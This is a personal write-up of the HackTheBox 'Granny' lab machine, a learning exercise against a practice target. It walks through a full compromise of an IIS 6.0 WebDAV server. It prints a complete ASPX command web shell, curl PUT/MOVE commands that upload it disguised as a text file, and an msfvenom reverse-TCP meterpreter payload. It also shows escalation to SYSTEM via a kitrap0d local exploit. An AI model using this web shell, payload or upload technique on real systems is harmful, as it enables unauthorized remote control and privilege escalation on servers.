# HackTheBox - Granny Writeup 6/10/2025

## 1. Scan for Open Ports and Services
```bash
Nmap -sV -sC TARGET_IP
```
### Nmap Results
```bash
 PORT   STATE SERVICE VERSION
 80/tcp open  http    Microsoft IIS httpd 6.0

 |_http-server-header: Microsoft-IIS/6.0

| http-ntlm-info: 

|   Target_Name: GRANNY

|   NetBIOS_Domain_Name: GRANNY

|   NetBIOS_Computer_Name: GRANNY

|   DNS_Domain_Name: granny

|   DNS_Computer_Name: granny

|_  Product_Version: 5.2.3790

| http-webdav-scan: 

|   Server Type: Microsoft-IIS/6.0

|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH

|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK

|   Server Date: Tue, 10 Jun 2025 23:14:37 GMT

|_  WebDAV type: Unknown

| http-methods: 

|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT

|_http-title: Under Construction

Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```
**One important take a way is the allowe HTTP methods on the target machine. Methods such as "PUT" and "MOVE" could be leveraged to upload files.

---

## 2. Enumeration

I used 'davtest' a tool that tests WebDav-enabled servers. It helps determine whether you can upload and execute files on a target web server via the WebDAV protocol. Below are the 'davtest' results.

```bash
Testing DAV connection
OPEN            SUCCEED:                http://10.129.95.234
********************************************************
NOTE    Random string for this session: k_uGl69UU
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.129.95.234/DavTestDir_k_uGl69UU
********************************************************
 Sending test files
PUT     pl      SUCCEED:        http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.pl
PUT     jhtml   SUCCEED:        http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.jhtml
PUT     txt     SUCCEED:        http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.txt
PUT     cgi     FAIL
PUT     asp     FAIL
PUT     php     SUCCEED:        http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.php
PUT     aspx    FAIL
PUT     html    SUCCEED:        http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.html
PUT     shtml   FAIL
PUT     cfm     SUCCEED:        http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.cfm
PUT     jsp     SUCCEED:        http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.jsp
********************************************************
 Checking for test file execution
EXEC    pl      FAIL
EXEC    jhtml   FAIL
EXEC    txt     SUCCEED:        http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.txt
EXEC    txt     FAIL
EXEC    php     FAIL
EXEC    html    SUCCEED:        http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.html
EXEC    html    FAIL
EXEC    cfm     FAIL
EXEC    jsp     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.129.95.234/DavTestDir_k_uGl69UU
PUT File: http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.pl
PUT File: http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.jhtml
PUT File: http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.txt
PUT File: http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.php
PUT File: http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.html
PUT File: http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.cfm
PUT File: http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.jsp
Executes: http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.txt
Executes: http://10.129.95.234/DavTestDir_k_uGl69UU/davtest_k_uGl69UU.html
```

The results show what extensions succeeded and what failed. The aspx extension was not successful.

Using 'curl' I attempted to upload a txt file to verify if I can really upload one based off the above results.

```bash
curl -X PUT http://10.129.95.234/test.txt -d @test.txt
```

The upload was a success, next I attempted to upload a file with the .aspx extension. Just like as the results from the davtest pointed out, I was not successful with this attempt.

Knowing I can upload a .txt file and use the "PUT" and "MOVE" http methods, my plan was to upload an .aspx webshell and use the "MOVE" method to move it to a new directory on the server.

The webshell will come from 

```bash
/usr/share/webshells/aspx/cmasp.aspx
```
```bash
cat cmdasp.aspx
<%@ Page Language="C#" Debug="true" Trace="false" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<script Language="c#" runat="server">
void Page_Load(object sender, EventArgs e)
{
}
string ExcuteCmd(string arg)
{
ProcessStartInfo psi = new ProcessStartInfo();
psi.FileName = "cmd.exe";
psi.Arguments = "/c "+arg;
psi.RedirectStandardOutput = true;
psi.UseShellExecute = false;
Process p = Process.Start(psi);
StreamReader stmrdr = p.StandardOutput;
string s = stmrdr.ReadToEnd();
stmrdr.Close();
return s;
}
void cmdExe_Click(object sender, System.EventArgs e)
{
Response.Write("<pre>");
Response.Write(Server.HtmlEncode(ExcuteCmd(txtArg.Text)));
Response.Write("</pre>");
}
</script>
<HTML>
<HEAD>
<title>awen asp.net webshell</title>
</HEAD>
<body >
<form id="cmd" method="post" runat="server">
<asp:TextBox id="txtArg" style="Z-INDEX: 101; LEFT: 405px; POSITION: absolute; TOP: 20px" runat="server" Width="250px"></asp:TextBox>
<asp:Button id="testing" style="Z-INDEX: 102; LEFT: 675px; POSITION: absolute; TOP: 18px" runat="server" Text="excute" OnClick="cmdExe_Click"></asp:Button>
<asp:Label id="lblText" style="Z-INDEX: 103; LEFT: 310px; POSITION: absolute; TOP: 22px" runat="server">Command:</asp:Label>
</form>
</body>
</HTML>

<!-- Contributed by Dominic Chell (http://digitalapocalypse.blogspot.com/) -->
<!--    http://michaeldaw.org   04/2007    -->
```
CURL Command:
```bash
curl -X PUT http://10.129.95.234/test.txt -d @cmdasp.aspx
```
The command above used the "PUT" method to upload the webshell disguised as a .txt file.

```bash
curl -X MOVE -H 'Destintion:http://TARGET/test.aspx' http://TARGET/test.txt
```
The 'MOVE' method was used to relocate the webshell to the same directory with a different file extension.

After being successful with this, it was time to use msfvenom to craft a payload and replicate the same method

---

## 3. Exploitation

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=4444 -f aspx > shell.aspx
```
Using "CURL" I will upload the payload:
```bash
curl -X PUT http://10.129.95.234/shell.txt --data-binary @shell.aspx
```
--data-binary is to ensure the preservation of newlines and other control characters.
```bash
curl -X MOVE -H 'Destination:http://TARGET/shell.aspx' http://TARGET/shell.txt
```
My next step is loading the Metasploit handler so I can catch the shell after triggering the payload.
```bash
exploit/multi/handler
```

After setting my options and running the exploit, I triggered the payload.
```bash
curl http://10.129.95.234/shell.aspx
```

After triggering the payload I got a shell.


---

## 4. Post Exploitation

After gaining access, I used the below commands to get information:

```bash
getuid
ps
```
Below are the results:
```bash
meterpreter > getuid
Server username: NT AUTHORITY\NETWORK SERVICE
meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System
 192   1096  cidaemon.exe
 272   4     smss.exe
 308   1096  cidaemon.exe
 320   272   csrss.exe
 324   1096  cidaemon.exe
 344   272   winlogon.exe
 392   344   services.exe
 404   344   lsass.exe
 584   392   svchost.exe
 668   392   svchost.exe
 732   392   svchost.exe
 776   392   svchost.exe
 796   392   svchost.exe
 944   392   spoolsv.exe
 988   392   msdtc.exe
 1096  392   cisvc.exe
 1136  392   svchost.exe
 1192  392   inetinfo.exe
 1228  392   svchost.exe
 1340  392   VGAuthService.exe
 1404  392   vmtoolsd.exe
 1512  392   svchost.exe
 1612  392   svchost.exe
 1820  392   alg.exe
 1832  584   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1840  392   dllhost.exe
 2148  344   logon.scr
 2516  584   wmiprvse.exe
 2708  584   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 3884  1512  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
```
There was no other processes I can migrate to in hopes of escalating privileges.

I used the "local exploit suggester" next to look for alternative ways of escalating my privileges.

```bash

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
```
After doing some research, I chose option 1

Once I was done setting my options and running the exploit, my privileges were successfully exploited:

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM   
```
---

## 5. Flag Locations
```bash
meterpreter > cd "Documents and Settings"
meterpreter > ls
Listing: c:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-04-12 14:48:10 -0400  Administrator
040777/rwxrwxrwx  0     dir   2017-04-12 10:03:34 -0400  All Users
040777/rwxrwxrwx  0     dir   2017-04-12 10:04:48 -0400  Default User
040777/rwxrwxrwx  0     dir   2017-04-12 15:19:46 -0400  Lakis
040777/rwxrwxrwx  0     dir   2017-04-12 10:08:32 -0400  LocalService
040777/rwxrwxrwx  0     dir   2017-04-12 10:08:31 -0400  NetworkService
```
---
## References

- https://www.rapid7.com/db/modules/exploit/windows/local/ms10_015_kitrap0d/


---

## Tools Used

- Nmap
- davtest
- CURL
- Metasploit
  

---

## Lessons Learned

- Using davtest for further enumeration of Web-Dav-enabled servers
- Crafting payloads with msfvenom and uploading them with CURL
- Research of different exploits
